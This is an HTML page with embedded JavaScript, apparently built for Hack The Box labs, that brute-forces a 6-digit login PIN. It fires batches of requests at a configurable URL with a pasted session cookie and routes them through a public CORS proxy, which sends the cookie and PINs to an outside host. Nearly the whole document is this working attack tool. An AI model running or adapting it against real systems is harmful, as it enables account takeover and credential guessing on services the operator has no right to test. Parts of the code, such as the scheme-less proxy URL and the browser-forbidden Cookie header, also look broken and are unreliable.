<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HTB 6-Digit PIN Brute Forcer</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #1a1a1a; color: #fff; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; background: #2a2a2a; padding: 20px; border-radius: 8px; }
        label { display: block; margin-top: 10px; font-weight: bold; }
        input, select { width: 100%; padding: 8px; margin-top: 5px; box-sizing: border-box; background: #333; color: #fff; border: 1px solid #555; border-radius: 4px; }
        button { background-color: #00b300; color: white; padding: 10px 15px; border: none; border-radius: 4px; margin-top: 15px; cursor: pointer; width: 100%; font-size: 16px; }
        button:disabled { background-color: #555; cursor: not-allowed; }
        #log { background: #000; color: #00ff00; padding: 10px; height: 200px; overflow-y: scroll; margin-top: 15px; font-family: monospace; font-size: 12px; border-radius: 4px; }
        .success { color: #00ff00; font-weight: bold; }
    </style>
</head>
<body>

<div class="container">
    <h2>HTB PIN Brute Forcer</h2>
    
    <label>Target URL:</label>
    <input type="text" id="targetUrl" value="http://<TARGET_IP>/login" placeholder="http://10.10.10.x/login">
    
    <label>HTTP Method:</label>
    <select id="method">
        <option value="POST">POST</option>
        <option value="GET">GET</option>
    </select>

    <label>PIN Parameter Name:</label>
    <input type="text" id="paramName" value="pin">

    <label>Cookie Header Name:</label>
    <input type="text" id="cookieName" value="PHPSESSID">

    <label>Cookie Value:</label>
    <input type="text" id="cookieValue" placeholder="Paste your active session cookie here">

    <label>Failure Keyword (Stop if this is NOT in response):</label>
    <input type="text" id="failWord" value="Invalid PIN">

    <button id="startBtn" onclick="startBruteForce()">Start Process</button>
    
    <div id="log">[*] System ready. Fill configuration and press Start.</div>
</div>

<script>
let running = false;

function log(msg, isSuccess = false) {
    const logDiv = document.getElementById('log');
    const span = document.createElement('span');
    if (isSuccess) span.className = 'success';
    span.textContent = msg + '\n';
    logDiv.appendChild(span);
    logDiv.scrollTop = logDiv.scrollHeight;
}

async function tryPin(pin, url, method, param, cookieName, cookieVal, failWord) {
    const formattedPin = String(pin).padStart(6, '0');
    
    // Using a public CORS proxy to bypass browser restrictions
    const proxyUrl = 'corsproxy.io?' + encodeURIComponent(url);
    
    let fetchUrl = proxyUrl;
    let options = {
        method: method,
        headers: {
            'X-Requested-With': 'XMLHttpRequest',
            'Cookie': `${cookieName}=${cookieVal}`
        }
    };

    if (method === 'POST') {
        options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
        options.body = `${encodeURIComponent(param)}=${encodeURIComponent(formattedPin)}`;
    } else {
        fetchUrl += (url.includes('?') ? '&' : '?') + `${encodeURIComponent(param)}=${encodeURIComponent(formattedPin)}`;
    }

    try {
        const response = await fetch(fetchUrl, options);
        const text = await response.text();
        
        if (!text.includes(failWord)) {
            return { success: true, pin: formattedPin };
        }
    } catch (err) {
        // Silent catch for network errors during high-speed blasting
    }
    return { success: false, pin: formattedPin };
}

async function startBruteForce() {
    if (running) return;
    
    const url = document.getElementById('targetUrl').value;
    const method = document.getElementById('method').value;
    const param = document.getElementById('paramName').value;
    const cookieName = document.getElementById('cookieName').value;
    const cookieVal = document.getElementById('cookieValue').value;
    const failWord = document.getElementById('failWord').value;

    if (!cookieVal) {
        alert('Please provide a cookie value!');
        return;
    }

    running = true;
    document.getElementById('startBtn').disabled = true;
    document.getElementById('log').innerHTML = '';
    log(`[*] Starting attack against ${url}...`);

    // Iterating batch blocks to keep the browser responsive
    const batchSize = 15; 
    for (let i = 0; i < 1000000; i += batchSize) {
        if (!running) break;

        if (i % 300 === 0) {
            log(`[-] Testing range starting at: ${String(i).padStart(6, '0')}`);
            // Small pause to yield control back to the UI thread
            await new Promise(r => setTimeout(r, 40)); 
        }

        const promises = [];
        for (let j = 0; j < batchSize && (i + j) < 1000000; j++) {
            promises.push(tryPin(i + j, url, method, param, cookieName, cookieVal, failWord));
        }

        const results = await Promise.all(promises);
        for (const res of results) {
            if (res.success) {
                log(`[+] SUCCESS! Valid PIN found: ${res.pin}`, true);
                running = false;
                document.getElementById('startBtn').disabled = false;
                return;
            }
        }
    }

    log('[-] Process finished. No valid PIN detected.');
    running = false;
    document.getElementById('startBtn').disabled = false;
}
</script>

</body>
</html>
